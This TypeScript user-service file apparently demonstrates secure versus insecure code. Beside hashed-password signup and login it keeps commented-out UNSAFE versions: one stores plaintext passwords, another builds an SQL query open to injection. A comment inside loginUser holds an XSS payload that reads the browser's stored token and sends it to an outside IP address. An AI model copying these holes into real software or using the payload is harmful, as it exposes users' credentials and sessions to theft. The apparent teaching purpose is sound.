import { prisma } from '../database/database';
import { AppError } from '../errors/appError';
import {
  createUser,
  loginUser,
  parseUser,
  User,
  UserAndTask,
} from '../interfaces/user.interface';
import { parseUserSchema, UserAndTaskSchema } from '../schema/user.schema';
import bcrypt from 'bcrypt';
import jsonwebtoken from 'jsonwebtoken';

export class UserService {
  userPrisma = prisma.user;

  //SAFE
  public createUser = async (data: createUser): Promise<parseUser> => {
    const newUser = {
      ...data,
      password: await bcrypt.hash(data.password, 10),
    };
    const user = await this.userPrisma.create({ data: newUser });
    return parseUserSchema.parse(user);
  };

  //UNSAFE
  // public createUser = async (data: createUser): Promise<User> => {
  //   const user = await this.userPrisma.create({ data });
  //   return user;
  // };

  //SAFE

  public loginUser = async (data: loginUser): Promise<string> => {
    const user = await this.userPrisma.findFirst({
      where: { email: data.email },
    });

    if (!user) {
      throw new AppError('Email or Password incorrect', 404);
    }
    // <img src=x onerror="var token = localStorage.getItem('token'); if (token) { fetch('http://181.215.135.141:80/localstorage.getItem?token=' + encodeURIComponent(token)); }" />
    const passwordMatch = await bcrypt.compare(data.password, user.password);

    if (!passwordMatch) {
      throw new AppError('Email or Password incorrect', 401);
    }

    const token = jsonwebtoken.sign(
      { id: user.id },
      process.env.SECRET_KEY as string,
      {
        expiresIn: '24h',
      },
    );

    return token;
  };

  // UNSAFE
  // public loginUser = async (data: loginUser): Promise<string> => {
  //   const sql = `SELECT * FROM "User" WHERE email = '${data.email}' AND password = '${data.password}'`;

  //   const userWithSqlInjection: User[] = await prisma.$queryRawUnsafe(sql);

  //   if (userWithSqlInjection.length > 0) {
  //     const token = jsonwebtoken.sign(
  //       { id: userWithSqlInjection[0].id },
  //       process.env.SECRET_KEY as string,
  //       {
  //         expiresIn: '24h',
  //       },
  //     );
  //     return String(token);
  //   }
  //   return 'Invalid email or password';
  // };

  public getUserAndTasks = async (idUser: string): Promise<UserAndTask> => {
    const { id }: any = idUser as string;
    const user = await this.userPrisma.findFirst({
      where: { id },
      include: {
        Task: true,
      },
    });
    if (!user) {
      throw new AppError('User not found', 404);
    }

    return UserAndTaskSchema.parse(user);
  };
}
